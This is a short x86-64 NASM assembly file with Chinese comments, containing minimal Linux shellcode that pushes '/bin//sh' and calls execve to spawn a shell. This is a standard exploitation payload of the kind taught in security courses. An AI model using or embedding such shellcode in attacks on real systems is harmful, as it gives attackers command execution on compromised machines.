BITS 64
section .text
global _start
_start:
    xor rdi, rdi        ; 清零rdi
    xor rsi, rsi        ; 清零rsi
    xor rdx, rdx        ; 清零rdx
    xor rax, rax        ; 清零rax
    push rax            ; 压入null
    mov rbx, 0x68732f2f6e69622f ; "/bin//sh"
    push rbx
    mov rdi, rsp        ; 第一个参数：字符串地址
    mov al, 59          ; execve系统调用号
    syscall